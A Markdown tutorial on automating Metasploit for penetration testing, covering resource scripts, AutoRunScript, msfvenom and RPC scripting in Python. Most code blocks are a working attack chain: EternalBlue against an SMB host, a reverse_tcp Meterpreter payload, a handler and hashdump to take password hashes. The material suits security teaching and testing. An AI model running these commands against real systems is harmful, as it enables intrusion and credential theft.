# Automating Tasks in Metasploit

## Introduction
Automating tasks in Metasploit can significantly improve efficiency, reduce repetitive manual work, and streamline penetration testing operations. Automation allows security professionals to execute predefined tasks quickly and consistently. This document covers scripting in Metasploit, resource scripts, automation with MSFConsole, and using Metasploit RPC for deeper automation.

## Table of Contents
- [Using Resource Scripts](#using-resource-scripts)
- [Automating with MSFConsole](#automating-with-msfconsole)
- [Metasploit RPC for Advanced Automation](#metasploit-rpc-for-advanced-automation)
- [Example: Automating Exploit Execution](#example-automating-exploit-execution)
- [Conclusion](#conclusion)

## Using Resource Scripts
Metasploit allows scripting with resource files (`.rc` scripts) that contain a series of commands to be executed automatically.

### Creating a Resource Script
A resource script is a text file containing Metasploit commands that execute sequentially.

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set LHOST 192.168.1.10
set LPORT 4444
exploit -j
```

### Running a Resource Script
Save the above commands as `exploit_script.rc` and run it in MSFConsole:

```bash
msfconsole -r exploit_script.rc
```

## Automating with MSFConsole
Metasploit provides built-in automation capabilities within MSFConsole.

### AutoRunScripts in Meterpreter
Meterpreter can execute scripts automatically upon session creation.

```bash
set AutoRunScript post/windows/manage/migrate
```

This ensures that upon a successful exploit, the Meterpreter session will immediately migrate to another process.

### Automating Payload Generation
You can automate payload creation using msfvenom in a script:

```bash
#!/bin/bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > payload.exe
```

Save it as `generate_payload.sh` and execute it:

```bash
chmod +x generate_payload.sh
./generate_payload.sh
```

## Metasploit RPC for Advanced Automation
Metasploit provides an RPC (Remote Procedure Call) service that allows external applications to interact with it programmatically.

### Starting the RPC Server
Run the following command inside Metasploit:

```bash
load msgrpc ServerPort=55553 User=msf Pass=secret
```

### Automating Exploits with Python
You can automate Metasploit tasks using Python and the msfrpc library.

#### Install Dependencies:
```bash
pip install msfrpc
```

#### Python Script to Launch an Exploit:
```python
from metasploit.msfrpc import MsfRpcClient

client = MsfRpcClient('secret', port=55553)
exploit = client.modules.use('exploit', 'windows/smb/ms17_010_eternalblue')
exploit['RHOSTS'] = '192.168.1.100'
exploit.execute()
```

## Example: Automating Exploit Execution
This example automates an entire attack process, including:
- Selecting an exploit
- Setting parameters
- Executing the exploit
- Running post-exploitation commands

### Resource Script Example (`automate_attack.rc`)
```bash
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444
run -j

sessions -i 1
sysinfo
hashdump
```

Run the script:
```bash
msfconsole -r automate_attack.rc
```

## Conclusion
Automation in Metasploit enhances efficiency and effectiveness in penetration testing. By leveraging resource scripts, MSFConsole automation, and Metasploit RPC, security professionals can streamline their workflows, execute exploits faster, and improve overall assessment efficiency. Always use automation responsibly within legal and ethical boundaries.

